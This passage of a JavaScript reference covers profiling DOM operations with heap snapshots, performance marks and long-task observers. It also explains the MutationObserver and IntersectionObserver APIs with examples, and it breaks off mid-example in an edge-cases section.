### Memory Profiling for DOM Operations

#### Heap Snapshots

Chrome DevTools Memory panel captures DOM node retention:

```javascript
// Take snapshot before operation
// DevTools → Memory → Take heap snapshot

function createDetachedNodes() {
  const nodes = [];
  
  for (let i = 0; i < 10000; i++) {
    const div = document.createElement('div');
    div.textContent = `Detached ${i}`;
    nodes.push(div); // Keeps nodes in memory even if not attached
  }
  
  return nodes; // Memory leak if never cleaned up
}

const detached = createDetachedNodes();

// Take another snapshot and compare
// Look for "Detached DOM tree" entries
```

#### Allocation Timeline

Records memory allocations over time to identify leaks:

```javascript
// Start allocation profiling in DevTools
function addEventListeners() {
  const buttons = document.querySelectorAll('button');
  
  buttons.forEach(button => {
    // Potential memory leak: listener retains closure scope
    button.addEventListener('click', function handler() {
      console.log(this.dataset.value);
      // If button is removed without removeEventListener,
      // the handler and button remain in memory
    });
  });
}

// Proper cleanup
function addEventListenersClean() {
  const buttons = document.querySelectorAll('button');
  const handlers = new WeakMap();
  
  buttons.forEach(button => {
    const handler = () => console.log(button.dataset.value);
    handlers.set(button, handler);
    button.addEventListener('click', handler);
  });
  
  // Cleanup function
  return () => {
    buttons.forEach(button => {
      const handler = handlers.get(button);
      if (handler) {
        button.removeEventListener('click', handler);
      }
    });
  };
}
```

### Custom Performance Monitoring

#### Building a DOM Operation Profiler

```javascript
class DOMProfiler {
  constructor() {
    this.operations = new Map();
    this.observers = [];
  }
  
  start(operationName) {
    performance.mark(`${operationName}-start`);
    
    if (!this.operations.has(operationName)) {
      this.operations.set(operationName, {
        count: 0,
        totalDuration: 0,
        measurements: []
      });
    }
  }
  
  end(operationName) {
    const endMark = `${operationName}-end`;
    const measureName = `${operationName}-measure`;
    
    performance.mark(endMark);
    performance.measure(
      measureName,
      `${operationName}-start`,
      endMark
    );
    
    const measures = performance.getEntriesByName(measureName);
    const duration = measures[measures.length - 1].duration;
    
    const stats = this.operations.get(operationName);
    stats.count++;
    stats.totalDuration += duration;
    stats.measurements.push(duration);
    
    // Clean up marks
    performance.clearMarks(`${operationName}-start`);
    performance.clearMarks(endMark);
    performance.clearMeasures(measureName);
    
    return duration;
  }
  
  getStats(operationName) {
    const stats = this.operations.get(operationName);
    if (!stats || stats.count === 0) return null;
    
    const sorted = [...stats.measurements].sort((a, b) => a - b);
    const median = sorted[Math.floor(sorted.length / 2)];
    const min = sorted[0];
    const max = sorted[sorted.length - 1];
    const avg = stats.totalDuration / stats.count;
    
    return {
      count: stats.count,
      average: avg,
      median,
      min,
      max,
      total: stats.totalDuration
    };
  }
  
  report() {
    const report = {};
    
    for (const [name, stats] of this.operations) {
      report[name] = this.getStats(name);
    }
    
    return report;
  }
  
  clear() {
    this.operations.clear();
    performance.clearMarks();
    performance.clearMeasures();
  }
}

// Usage
const profiler = new DOMProfiler();

profiler.start('render-list');
const ul = document.createElement('ul');
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  li.textContent = `Item ${i}`;
  ul.appendChild(li);
}
document.body.appendChild(ul);
profiler.end('render-list');

console.log(profiler.getStats('render-list'));
```

### Mutation Observer Performance Impact

MutationObserver itself adds overhead. Profile its impact:

```javascript
function profileMutationObserver() {
  const container = document.getElementById('container');
  
  // Baseline without observer
  performance.mark('baseline-start');
  for (let i = 0; i < 1000; i++) {
    container.appendChild(document.createElement('div'));
  }
  performance.mark('baseline-end');
  performance.measure('baseline', 'baseline-start', 'baseline-end');
  
  // Clear container
  container.innerHTML = '';
  
  // With observer
  const observer = new MutationObserver((mutations) => {
    // Processing overhead
    mutations.forEach(mutation => {
      mutation.addedNodes.forEach(node => {
        // Some processing
      });
    });
  });
  
  observer.observe(container, { childList: true });
  
  performance.mark('observed-start');
  for (let i = 0; i < 1000; i++) {
    container.appendChild(document.createElement('div'));
  }
  performance.mark('observed-end');
  performance.measure('observed', 'observed-start', 'observed-end');
  
  observer.disconnect();
  
  const baseline = performance.getEntriesByName('baseline')[0].duration;
  const observed = performance.getEntriesByName('observed')[0].duration;
  
  console.log(`Baseline: ${baseline}ms`);
  console.log(`With Observer: ${observed}ms`);
  console.log(`Overhead: ${observed - baseline}ms (${((observed / baseline - 1) * 100).toFixed(2)}%)`);
}
```

### Long Task API

Identifies operations blocking the main thread for extended periods:

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    // Long tasks are >= 50ms
    console.warn(`Long task detected: ${entry.duration}ms`, {
      name: entry.name,
      startTime: entry.startTime,
      attribution: entry.attribution
    });
  }
});

observer.observe({ entryTypes: ['longtask'] });

// Simulate long DOM operation
function longDOMOperation() {
  const container = document.createElement('div');
  
  // Intentionally blocking operation
  for (let i = 0; i < 100000; i++) {
    const div = document.createElement('div');
    div.textContent = `Item ${i}`;
    div.style.width = '100px';
    div.style.height = '50px';
    container.appendChild(div);
  }
  
  document.body.appendChild(container);
}

// This will likely trigger longtask entries
longDOMOperation();
```

### Real User Monitoring (RUM) Metrics

#### First Contentful Paint (FCP) and DOM Operations

```javascript
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.name === 'first-contentful-paint') {
      console.log(`FCP: ${entry.startTime}ms`);
      
      // Correlate with DOM ready time
      const domReady = performance.timing.domContentLoadedEventEnd - 
                      performance.timing.navigationStart;
      console.log(`DOM Ready: ${domReady}ms`);
      console.log(`FCP delay after DOM: ${entry.startTime - domReady}ms`);
    }
  }
});

observer.observe({ entryTypes: ['paint'] });
```

#### Cumulative Layout Shift (CLS) from DOM Operations

```javascript
let clsScore = 0;

const clsObserver = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (!entry.hadRecentInput) {
      clsScore += entry.value;
      console.log('Layout shift:', {
        value: entry.value,
        cumulative: clsScore,
        sources: entry.sources
      });
    }
  }
});

clsObserver.observe({ entryTypes: ['layout-shift'] });

// DOM operation that causes layout shift
function causeLayoutShift() {
  const img = document.createElement('img');
  img.src = 'large-image.jpg';
  // No width/height specified - will shift layout when loaded
  document.body.insertBefore(img, document.body.firstChild);
}
```

### Comparative Profiling Techniques

#### Batch vs Individual Operations

```javascript
function compareDOMApproaches() {
  const iterations = 1000;
  
  // Approach 1: Individual appendChild
  performance.mark('individual-start');
  const container1 = document.createElement('div');
  for (let i = 0; i < iterations; i++) {
    const div = document.createElement('div');
    container1.appendChild(div);
  }
  document.body.appendChild(container1);
  performance.mark('individual-end');
  
  // Approach 2: DocumentFragment
  performance.mark('fragment-start');
  const container2 = document.createElement('div');
  const fragment = document.createDocumentFragment();
  for (let i = 0; i < iterations; i++) {
    const div = document.createElement('div');
    fragment.appendChild(div);
  }
  container2.appendChild(fragment);
  document.body.appendChild(container2);
  performance.mark('fragment-end');
  
  // Approach 3: innerHTML
  performance.mark('innerHTML-start');
  const container3 = document.createElement('div');
  let html = '';
  for (let i = 0; i < iterations; i++) {
    html += '<div></div>';
  }
  container3.innerHTML = html;
  document.body.appendChild(container3);
  performance.mark('innerHTML-end');
  
  // Measure
  performance.measure('individual', 'individual-start', 'individual-end');
  performance.measure('fragment', 'fragment-start', 'fragment-end');
  performance.measure('innerHTML', 'innerHTML-start', 'innerHTML-end');
  
  console.table({
    'Individual appendChild': performance.getEntriesByName('individual')[0].duration,
    'DocumentFragment': performance.getEntriesByName('fragment')[0].duration,
    'innerHTML': performance.getEntriesByName('innerHTML')[0].duration
  });
  
  // Cleanup
  container1.remove();
  container2.remove();
  container3.remove();
  performance.clearMarks();
  performance.clearMeasures();
}

compareDOMApproaches();
```

### Automated Performance Testing

#### Performance Budget Enforcement

```javascript
class PerformanceBudget {
  constructor(budgets) {
    this.budgets = budgets; // { operationName: maxDuration }
    this.violations = [];
  }
  
  check(operationName, duration) {
    const budget = this.budgets[operationName];
    
    if (budget && duration > budget) {
      const violation = {
        operation: operationName,
        budget,
        actual: duration,
        excess: duration - budget,
        timestamp: Date.now()
      };
      
      this.violations.push(violation);
      console.warn(`Performance budget exceeded:`, violation);
      
      return false;
    }
    
    return true;
  }
  
  getViolations() {
    return this.violations;
  }
  
  reset() {
    this.violations = [];
  }
}

// Usage
const budget = new PerformanceBudget({
  'render-list': 16.67, // One frame at 60fps
  'update-item': 5,
  'scroll-handler': 10
});

function monitoredOperation(name, fn) {
  const start = performance.now();
  const result = fn();
  const duration = performance.now() - start;
  
  budget.check(name, duration);
  
  return result;
}

monitoredOperation('render-list', () => {
  // DOM operation
  const ul = document.createElement('ul');
  for (let i = 0; i < 1000; i++) {
    ul.appendChild(document.createElement('li'));
  }
  document.body.appendChild(ul);
});
```

---

# Browser APIs Related to DOM

## MutationObserver

The `MutationObserver` interface provides a mechanism to asynchronously observe changes to the DOM tree, replacing the deprecated Mutation Events specification with a more performant and flexible solution.

### Constructor and Instantiation

```javascript
const observer = new MutationObserver(callback);
```

The constructor accepts a single callback function that executes when observed mutations occur. The callback receives two parameters:

```javascript
const callback = (mutationsList, observer) => {
  // mutationsList: Array of MutationRecord objects
  // observer: The MutationObserver instance itself
};
```

### Core Methods

**observe(target, options)**

Initiates observation of a target node with specified configuration:

```javascript
observer.observe(targetNode, {
  childList: boolean,
  attributes: boolean,
  characterData: boolean,
  subtree: boolean,
  attributeOldValue: boolean,
  characterDataOldValue: boolean,
  attributeFilter: array
});
```

**disconnect()**

Stops the observer from receiving notifications. Previously queued mutations are discarded:

```javascript
observer.disconnect();
```

**takeRecords()**

Synchronously retrieves all pending mutation records from the observer's queue and clears it:

```javascript
const pendingMutations = observer.takeRecords();
// Returns array of MutationRecord objects
```

### Configuration Options

**childList (boolean)**

Monitors additions and removals of child nodes (including text nodes):

```javascript
observer.observe(element, { childList: true });
// Detects: appendChild, removeChild, insertBefore, replaceChild
```

**attributes (boolean)**

Tracks changes to element attributes:

```javascript
observer.observe(element, { attributes: true });
// Detects: setAttribute, removeAttribute, attribute property changes
```

**characterData (boolean)**

Monitors modifications to text node content:

```javascript
observer.observe(textNode, { characterData: true });
// Detects: textContent, nodeValue, data property changes
```

**subtree (boolean)**

Extends observation to all descendants of the target node:

```javascript
observer.observe(element, { 
  childList: true, 
  subtree: true 
});
// Observes entire subtree, not just direct children
```

**attributeOldValue (boolean)**

Records the previous attribute value before modification. Requires `attributes: true`:

```javascript
observer.observe(element, { 
  attributes: true, 
  attributeOldValue: true 
});
// MutationRecord.oldValue contains previous attribute value
```

**characterDataOldValue (boolean)**

Records the previous text content before modification. Requires `characterData: true`:

```javascript
observer.observe(textNode, { 
  characterData: true, 
  characterDataOldValue: true 
});
// MutationRecord.oldValue contains previous text
```

**attributeFilter (Array\<string>)**

Limits attribute observation to specified attribute names. Implicitly sets `attributes: true`:

```javascript
observer.observe(element, { 
  attributeFilter: ['class', 'data-state'] 
});
// Only monitors class and data-state attributes
```

### MutationRecord Structure

Each mutation generates a `MutationRecord` object with the following properties:

**type (string)**

- `"childList"` - Child node modification
- `"attributes"` - Attribute change
- `"characterData"` - Text content change

**target (Node)** The node directly affected by the mutation.

**addedNodes (NodeList)** Nodes added to the tree (for `childList` mutations). Empty `NodeList` if none added.

**removedNodes (NodeList)** Nodes removed from the tree (for `childList` mutations). Empty `NodeList` if none removed.

**previousSibling (Node | null)** The previous sibling of added/removed nodes. `null` if no previous sibling or not applicable.

**nextSibling (Node | null)** The next sibling of added/removed nodes. `null` if no next sibling or not applicable.

**attributeName (string | null)** Name of the changed attribute (for `attributes` mutations). `null` for other mutation types.

**attributeNamespace (string | null)** Namespace of the changed attribute. `null` for non-namespaced attributes or other mutation types.

**oldValue (string | null)** Previous value before the mutation, if `attributeOldValue` or `characterDataOldValue` was enabled. `null` otherwise.

```javascript
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    console.log({
      type: mutation.type,
      target: mutation.target,
      addedNodes: mutation.addedNodes,
      removedNodes: mutation.removedNodes,
      attributeName: mutation.attributeName,
      oldValue: mutation.oldValue
    });
  });
});
```

### Execution Model and Timing

**Asynchronous microtask delivery:**

Mutation callbacks execute asynchronously as microtasks, not synchronously during DOM modifications. Multiple mutations within a single JavaScript execution context are batched and delivered together:

```javascript
element.setAttribute('class', 'one');
element.setAttribute('class', 'two');
element.setAttribute('class', 'three');
// Single callback invocation with 3 MutationRecords
```

**Delivery timing:**

Callbacks execute after the current JavaScript task completes but before the next task or rendering. This occurs during microtask checkpoint processing:

```javascript
element.textContent = 'Modified';
console.log('Synchronous');
// Callback executes here (microtask)
// Then rendering occurs
```

**Microtask queue ordering:**

MutationObserver callbacks execute in the order they were registered when multiple observers monitor the same changes:

```javascript
const observer1 = new MutationObserver(cb1);
const observer2 = new MutationObserver(cb2);
observer1.observe(element, { childList: true });
observer2.observe(element, { childList: true });
element.appendChild(node);
// cb1 executes before cb2
```

### Multiple Observers on Same Target

Multiple `MutationObserver` instances can observe the same node independently. Each receives its own mutation records:

```javascript
const observer1 = new MutationObserver(mutations => {
  console.log('Observer 1:', mutations.length);
});

const observer2 = new MutationObserver(mutations => {
  console.log('Observer 2:', mutations.length);
});

observer1.observe(element, { attributes: true });
observer2.observe(element, { childList: true });

element.setAttribute('class', 'test'); // Only observer1 notified
element.appendChild(node); // Only observer2 notified
```

### Re-observing Nodes

Calling `observe()` on an already-observed target with different options replaces the previous observation configuration:

```javascript
observer.observe(element, { childList: true });
// Later...
observer.observe(element, { attributes: true });
// Now only observes attributes, childList observation stopped
```

To observe multiple targets, call `observe()` multiple times with different target nodes:

```javascript
observer.observe(element1, { childList: true });
observer.observe(element2, { attributes: true });
// Single observer monitors both elements
```

### Performance Characteristics

**[Inference]** MutationObserver delivers significantly better performance than deprecated Mutation Events because:

1. **Batched delivery** - Multiple mutations are coalesced into a single callback invocation
2. **Asynchronous execution** - No synchronous event propagation overhead
3. **Selective monitoring** - Precise configuration reduces unnecessary processing
4. **No event bubbling** - Eliminates bubble/capture phase complexity

**Memory considerations:**

Each observer maintains internal state and references to observed nodes. Failing to call `disconnect()` can prevent garbage collection of observed DOM subtrees:

```javascript
// Potential memory leak
function attachObserver(element) {
  const observer = new MutationObserver(callback);
  observer.observe(element, { childList: true });
  // observer reference lost, but still observing
}

// Proper cleanup
function attachObserver(element) {
  const observer = new MutationObserver(callback);
  observer.observe(element, { childList: true });
  return observer; // Return for later disconnect()
}
```

### Common Use Cases

**Detecting dynamic content injection:**

```javascript
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    mutation.addedNodes.forEach(node => {
      if (node.nodeType === 1 && node.matches('.dynamic-content')) {
        initializeComponent(node);
      }
    });
  });
});

observer.observe(document.body, { 
  childList: true, 
  subtree: true 
});
```

**Monitoring attribute changes for reactive updates:**

```javascript
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.attributeName === 'data-state') {
      updateUI(mutation.target);
    }
  });
});

observer.observe(stateContainer, { 
  attributes: true, 
  attributeFilter: ['data-state'] 
});
```

**Lazy initialization when elements appear:**

```javascript
const observer = new MutationObserver((mutations, obs) => {
  const targetElement = document.querySelector('.lazy-target');
  if (targetElement) {
    initializeTarget(targetElement);
    obs.disconnect(); // Stop observing once found
  }
});

observer.observe(document.body, { 
  childList: true, 
  subtree: true 
});
```

**Tracking DOM modifications for undo/redo:**

```javascript
const historyStack = [];

const observer = new MutationObserver(mutations => {
  historyStack.push(mutations.map(m => ({
    type: m.type,
    target: m.target,
    oldValue: m.oldValue,
    addedNodes: Array.from(m.addedNodes),
    removedNodes: Array.from(m.removedNodes)
  })));
});

observer.observe(editableArea, {
  childList: true,
  attributes: true,
  characterData: true,
  subtree: true,
  attributeOldValue: true,
  characterDataOldValue: true
});
```

**Responding to external library DOM changes:**

```javascript
// Monitor changes made by third-party components
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.target.classList.contains('third-party-widget')) {
      syncApplicationState(mutation.target);
    }
  });
});

observer.observe(widgetContainer, {
  attributes: true,
  childList: true,
  subtree: true
});
```

### Interaction with Shadow DOM

MutationObserver can observe shadow roots directly:

```javascript
const shadowRoot = element.attachShadow({ mode: 'open' });
observer.observe(shadowRoot, { 
  childList: true, 
  subtree: true 
});
// Observes mutations within shadow tree
```

**[Inference]** Observing a shadow host element with `subtree: true` does not penetrate shadow boundaries. Shadow DOM mutations require separate observation of the shadow root itself.

### Transient Observer Pattern

For single-use observation scenarios, disconnect within the callback:

```javascript
const observer = new MutationObserver((mutations, obs) => {
  // Process mutations
  processChanges(mutations);
  
  // Immediately disconnect
  obs.disconnect();
});

observer.observe(element, { childList: true });
```

### Mutation Callback Recursion

DOM modifications within the mutation callback can trigger additional mutations. The observer queues these for the next microtask checkpoint:

```javascript
const observer = new MutationObserver(mutations => {
  // This modification triggers a new mutation
  element.setAttribute('data-count', counter++);
  // New mutation delivered in next microtask, not recursively
});

observer.observe(element, { attributes: true });
element.setAttribute('data-trigger', 'value');
// Initial callback executes
// Then callback for data-count mutation executes
```

**Preventing infinite loops:**

Without safeguards, mutation callbacks can create infinite loops:

```javascript
// Dangerous - infinite loop
const observer = new MutationObserver(mutations => {
  element.textContent = Math.random(); // Triggers mutation
});

observer.observe(element, { characterData: true, subtree: true });
element.textContent = 'initial'; // Starts infinite loop
```

**Safe patterns:**

```javascript
// Conditional modification
const observer = new MutationObserver(mutations => {
  const current = element.getAttribute('data-state');
  if (current !== 'processed') {
    element.setAttribute('data-state', 'processed');
  }
});

// Temporary disconnection
const observer = new MutationObserver(mutations => {
  observer.disconnect();
  element.textContent = 'Modified';
  observer.observe(element, { characterData: true, subtree: true });
});
```

### Browser Compatibility

MutationObserver has universal support across modern browsers:

- Chrome 26+
- Firefox 14+
- Safari 6.1+
- Edge (all versions)
- IE 11

The API is stable and specified in the DOM Standard maintained by WHATWG.

### Debugging Considerations

**Logging mutations comprehensively:**

```javascript
const observer = new MutationObserver(mutations => {
  console.group('Mutations detected:', mutations.length);
  mutations.forEach((mutation, index) => {
    console.log(`[${index}] Type: ${mutation.type}`);
    console.log('  Target:', mutation.target);
    
    if (mutation.type === 'childList') {
      console.log('  Added:', mutation.addedNodes.length);
      console.log('  Removed:', mutation.removedNodes.length);
    } else if (mutation.type === 'attributes') {
      console.log('  Attribute:', mutation.attributeName);
      console.log('  Old value:', mutation.oldValue);
      console.log('  New value:', mutation.target.getAttribute(mutation.attributeName));
    }
  });
  console.groupEnd();
});
```

**Tracking observer lifecycle:**

```javascript
class TrackedMutationObserver {
  constructor(callback) {
    this.active = false;
    this.targets = new Set();
    this.observer = new MutationObserver((mutations, obs) => {
      callback(mutations, this);
    });
  }
  
  observe(target, options) {
    this.observer.observe(target, options);
    this.targets.add(target);
    this.active = true;
  }
  
  disconnect() {
    this.observer.disconnect();
    this.targets.clear();
    this.active = false;
  }
  
  isObserving(target) {
    return this.targets.has(target);
  }
}
```

### Comparison to Mutation Events (Deprecated)

MutationObserver replaces the following deprecated Mutation Events:

- `DOMNodeInserted`
- `DOMNodeRemoved`
- `DOMSubtreeModified`
- `DOMAttrModified`
- `DOMCharacterDataModified`

**Key improvements:**

- Asynchronous vs. synchronous delivery
- Batched mutations vs. individual events
- No event propagation overhead
- Selective observation configuration
- Better performance characteristics

**Migration pattern:**

```javascript
// Old (deprecated)
element.addEventListener('DOMNodeInserted', (event) => {
  console.log('Node inserted:', event.target);
});

// New
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    mutation.addedNodes.forEach(node => {
      console.log('Node inserted:', node);
    });
  });
});

observer.observe(element, { childList: true });
```

### Working with takeRecords()

The `takeRecords()` method retrieves pending mutations before they're delivered to the callback:

```javascript
const observer = new MutationObserver(mutations => {
  console.log('Callback received:', mutations.length);
});

observer.observe(element, { attributes: true });

element.setAttribute('class', 'one');
element.setAttribute('class', 'two');

// Retrieve mutations before callback executes
const records = observer.takeRecords();
console.log('Taken records:', records.length); // 2

// Callback will not execute for these mutations
```

**Practical application - synchronous processing before disconnect:**

```javascript
function stopObservingAndProcess(observer) {
  const pendingMutations = observer.takeRecords();
  observer.disconnect();
  
  // Process any mutations that were queued but not yet delivered
  processMutations(pendingMutations);
}
```

### WeakRef and FinalizationRegistry Interactions

**[Inference]** MutationObserver maintains strong references to observed nodes, preventing garbage collection. This differs from `WeakRef` patterns and requires explicit `disconnect()` for cleanup:

```javascript
// Observer prevents garbage collection
let element = document.createElement('div');
const observer = new MutationObserver(callback);
observer.observe(element, { attributes: true });

element = null; // Element not collected due to observer reference
observer.disconnect(); // Now element can be collected
```

---

## IntersectionObserver

The IntersectionObserver API provides an efficient way to asynchronously observe changes in the intersection of a target element with an ancestor element or the viewport. It eliminates the need for expensive scroll event listeners and manual element position calculations.

## Constructor

```javascript
const observer = new IntersectionObserver(callback, options);
```

### Callback Function

The callback receives two parameters:

```javascript
function callback(entries, observer) {
    entries.forEach(entry => {
        // Handle each intersection change
    });
}
```

- **entries**: Array of `IntersectionObserverEntry` objects
- **observer**: The IntersectionObserver instance that invoked the callback

### Options Object

```javascript
const options = {
    root: null,              // Viewport or ancestor element
    rootMargin: '0px',       // Margin around root
    threshold: 0             // Single number or array
};
```

**root**: The element used as the viewport for checking visibility. Must be an ancestor of the target. Defaults to browser viewport if `null`.

**rootMargin**: Grows or shrinks the root's bounding box before computing intersections. Uses CSS margin syntax (`"10px 20px 30px 40px"`). Can use percentages.

**threshold**: Single number or array of numbers between 0.0 and 1.0, indicating at what percentage of the target's visibility the callback should execute.

## IntersectionObserverEntry Properties

Each entry object contains:

### Intersection Geometry

```javascript
entry.boundingClientRect    // Target's bounding rectangle
entry.intersectionRect      // Visible portion of target
entry.rootBounds           // Root's bounding rectangle
```

All rectangles are `DOMRectReadOnly` objects with properties: `x`, `y`, `width`, `height`, `top`, `right`, `bottom`, `left`.

### Intersection Data

```javascript
entry.intersectionRatio    // 0.0 to 1.0, visible ratio
entry.isIntersecting      // Boolean, target intersects root
entry.target              // The observed DOM element
entry.time                // DOMHighResTimeStamp when change occurred
```

**intersectionRatio**: Ratio of `intersectionRect` area to `boundingClientRect` area. Equals 0 when not visible, 1.0 when fully visible.

**isIntersecting**: `true` when target element intersects with root. More reliable than checking `intersectionRatio > 0` because it handles edge cases consistently.

**time**: Timestamp relative to the time origin, measured in milliseconds.

## Observer Methods

### observe()

Start observing a target element:

```javascript
observer.observe(targetElement);
```

Can observe multiple elements with the same observer:

```javascript
const elements = document.querySelectorAll('.observe-me');
elements.forEach(el => observer.observe(el));
```

### unobserve()

Stop observing a specific target:

```javascript
observer.unobserve(targetElement);
```

Commonly used for cleanup or when element no longer needs observation:

```javascript
entries.forEach(entry => {
    if (entry.isIntersecting) {
        // Handle intersection
        observer.unobserve(entry.target); // Stop observing
    }
});
```

### disconnect()

Stop observing all targets:

```javascript
observer.disconnect();
```

Typically called during cleanup:

```javascript
// Component cleanup
componentWillUnmount() {
    this.observer.disconnect();
}
```

### takeRecords()

Returns array of all queued `IntersectionObserverEntry` objects and clears the queue:

```javascript
const records = observer.takeRecords();
```

Useful for synchronous processing before disconnecting:

```javascript
const pending = observer.takeRecords();
pending.forEach(entry => processEntry(entry));
observer.disconnect();
```

## Threshold Configurations

### Single Threshold

```javascript
const observer = new IntersectionObserver(callback, {
    threshold: 0.5  // Trigger when 50% visible
});
```

Callback fires twice:

1. When visibility crosses 50% (increasing)
2. When visibility crosses 50% (decreasing)

### Multiple Thresholds

```javascript
const observer = new IntersectionObserver(callback, {
    threshold: [0, 0.25, 0.5, 0.75, 1.0]
});
```

Callback fires at each threshold crossing. Enables granular visibility tracking:

```javascript
function callback(entries) {
    entries.forEach(entry => {
        const percent = Math.round(entry.intersectionRatio * 100);
        console.log(`Element ${percent}% visible`);
    });
}
```

### Threshold Array Generation

```javascript
function buildThresholdArray(steps = 20) {
    const thresholds = [];
    for (let i = 0; i <= steps; i++) {
        thresholds.push(i / steps);
    }
    return thresholds;
}

const observer = new IntersectionObserver(callback, {
    threshold: buildThresholdArray(100)  // 101 thresholds: 0, 0.01, 0.02...1.0
});
```

## Root Margin Behavior

### Expanding the Root

```javascript
const observer = new IntersectionObserver(callback, {
    rootMargin: '50px'  // Trigger 50px before entering viewport
});
```

Positive margins expand the intersection area. Useful for preloading content before it becomes visible.

### Shrinking the Root

```javascript
const observer = new IntersectionObserver(callback, {
    rootMargin: '-20px'  // Trigger only when 20px inside viewport
});
```

Negative margins shrink the intersection area. Ensures elements are fully visible before triggering.

### Asymmetric Margins

```javascript
const observer = new IntersectionObserver(callback, {
    rootMargin: '0px 0px -100px 0px'  // Top Right Bottom Left
});
```

Delays triggering until element is 100px into viewport from bottom.

### Percentage-Based Margins

```javascript
const observer = new IntersectionObserver(callback, {
    rootMargin: '10%'  // 10% of root dimensions
});
```

[Inference] Percentage values are calculated relative to the root element's dimensions (width for horizontal, height for vertical).

## Custom Root Element

### Scrollable Container

```javascript
const container = document.getElementById('scrollable-container');

const observer = new IntersectionObserver(callback, {
    root: container,
    threshold: 0.5
});

const items = container.querySelectorAll('.item');
items.forEach(item => observer.observe(item));
```

The root must be an ancestor of all observed targets. Useful for:

- Infinite scroll within modals
- Nested scrollable regions
- Custom viewport implementations

### Root Requirements

The root element must have:

- Overflow clipping (e.g., `overflow: auto`, `overflow: hidden`, `overflow: scroll`)
- Be an ancestor of the observed targets

```javascript
// Valid root
const validRoot = document.querySelector('.scroll-container');
validRoot.style.overflow = 'auto';

// Invalid - will fall back to viewport
const invalidRoot = document.createElement('div');
// Not in DOM or not an ancestor
```

## Practical Use Cases

### Lazy Loading Images

```javascript
const imageObserver = new IntersectionObserver((entries, observer) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            const img = entry.target;
            img.src = img.dataset.src;
            img.classList.remove('lazy');
            observer.unobserve(img);
        }
    });
}, {
    rootMargin: '50px'  // Preload 50px before visible
});

document.querySelectorAll('img.lazy').forEach(img => {
    imageObserver.observe(img);
});
```

HTML structure:

```html
<img class="lazy" data-src="image.jpg" alt="Description">
```

### Infinite Scroll

```javascript
const sentinel = document.getElementById('sentinel');

const infiniteObserver = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            loadMoreContent();
        }
    });
}, {
    rootMargin: '200px'  // Trigger before reaching bottom
});

infiniteObserver.observe(sentinel);

async function loadMoreContent() {
    const newItems = await fetchItems();
    appendItemsToDOM(newItems);
}
```

### Scroll Animations

```javascript
const animationObserver = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.classList.add('animate-in');
        } else {
            entry.target.classList.remove('animate-in');
        }
    });
}, {
    threshold: 0.1
});

document.querySelectorAll('.animate-on-scroll').forEach(el => {
    animationObserver.observe(el);
});
```

### Analytics and Impression Tracking

```javascript
const impressionObserver = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            const adId = entry.target.dataset.adId;
            trackImpression(adId);
            impressionObserver.unobserve(entry.target);
        }
    });
}, {
    threshold: 0.5,  // At least 50% visible
    rootMargin: '0px'
});

document.querySelectorAll('.ad-unit').forEach(ad => {
    impressionObserver.observe(ad);
});
```

### Visibility Duration Tracking

```javascript
const visibilityTimers = new WeakMap();

const durationObserver = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            // Start timing
            visibilityTimers.set(entry.target, Date.now());
        } else {
            // Calculate duration
            const startTime = visibilityTimers.get(entry.target);
            if (startTime) {
                const duration = Date.now() - startTime;
                console.log(`Visible for ${duration}ms`);
                visibilityTimers.delete(entry.target);
            }
        }
    });
});
```

### Sticky Header Detection

```javascript
const header = document.querySelector('header');
const sentinel = document.createElement('div');
sentinel.style.height = '1px';
header.parentElement.insertBefore(sentinel, header);

const stickyObserver = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        header.classList.toggle('stuck', !entry.isIntersecting);
    });
}, {
    threshold: 1.0  // Fully visible or not
});

stickyObserver.observe(sentinel);
```

### Pausing Video Outside Viewport

```javascript
const videoObserver = new IntersectionObserver(entries => {
    entries.forEach(entry => {
        const video = entry.target;
        if (entry.isIntersecting) {
            video.play();
        } else {
            video.pause();
        }
    });
}, {
    threshold: 0.5
});

document.querySelectorAll('video[data-autoplay]').forEach(video => {
    videoObserver.observe(video);
});
```

## Performance Characteristics

### Efficiency Advantages

The IntersectionObserver API is optimized at the browser level:

- **No polling**: Callbacks fire only when intersection state changes
- **No forced reflow**: Browsers batch geometry calculations
- **Passive observation**: Doesn't block the main thread
- **Optimized for multiple targets**: Single observer can watch many elements efficiently

### Comparison with Scroll Events

Traditional approach problems:

```javascript
// ❌ Inefficient
window.addEventListener('scroll', () => {
    elements.forEach(el => {
        const rect = el.getBoundingClientRect();  // Forces reflow
        if (rect.top < window.innerHeight) {
            // Handle visibility
        }
    });
});
```

IntersectionObserver benefits:

- No need for `getBoundingClientRect()` calls
- No throttling/debouncing required
- Browser handles optimization automatically
- Works across frame boundaries

### Batching Behavior

[Inference] The browser batches intersection changes and delivers them asynchronously. Multiple changes may be reported in a single callback invocation:

```javascript
const observer = new IntersectionObserver(entries => {
    console.log(`Processing ${entries.length} changes`);
    // May receive multiple entries at once
});
```

## Callback Timing and Execution

### Initial Observation

The callback fires immediately (asynchronously) when `observe()` is called:

```javascript
const observer = new IntersectionObserver(entries => {
    console.log('Callback fired');
});

observer.observe(element);
// Callback fires shortly after, reporting initial state
```

This initial callback reports the current intersection state, even if threshold is not met.

### Asynchronous Execution

Callbacks execute asynchronously but are queued:

```javascript
console.log('1. Before observe');
observer.observe(element);
console.log('2. After observe');
// '3. Callback fired' appears after both

const observer = new IntersectionObserver(entries => {
    console.log('3. Callback fired');
});
```

### Callback Execution Context

The callback runs in the main thread but is scheduled by the browser's intersection observer task queue. [Inference] This means it doesn't block rendering but still executes synchronously once invoked.

## Edge Cases and Limitations

### Zero-Size Elements

Elements with no dimensions (0x0) are never considered intersecting:

```javascript
